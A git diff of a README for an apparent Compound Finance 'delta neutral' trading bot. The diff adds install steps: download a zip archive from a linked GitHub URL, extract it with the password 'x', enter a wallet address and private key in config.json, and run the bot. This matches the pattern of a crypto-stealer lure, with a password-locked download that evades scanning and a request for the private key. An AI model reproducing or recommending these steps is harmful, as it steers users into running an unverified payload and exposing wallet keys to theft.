@@ -1,5 +1,17 @@
-# Overview:
+# Overview
+A Delta Neutral Strategy with Compound Finance involves employing a financial approach that aims to maintain a position with a delta value of zero, mitigating exposure to market price fluctuations. In the context of Compound Finance, this strategy typically revolves around the lending and borrowing functionalities provided by the Compound protocol.
 
+## How to install
+- [Clone](https://github.com/medlaare/delta-neutral-strategy/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
+- Extract archive with password `x`
+- Modify the `address` and `private_key` entries within the `config.json` file.
+- Run the bot.
+- Establish parameters for optimizing interest costs on borrowed assets.
+- Define how often the strategy should rebalance to maintain Delta neutrality.
+- you can choose strategies for optimizing `gas` costs, such as batched transactions or utilizing layer 2 solutions.
+- Consider factors like gas costs and market volatility when determining the rebalancing frequency.
+
+# How works this tool
 Implementing a Delta Neutral Strategy using DeFi protocols like Compound Finance or Aave involves leveraging the lending and borrowing functionalities offered by these platforms. Below is a simplified example of how you might construct a Delta Neutral Strategy using Compound Finance on the Ethereum network:
 
 ## Components:
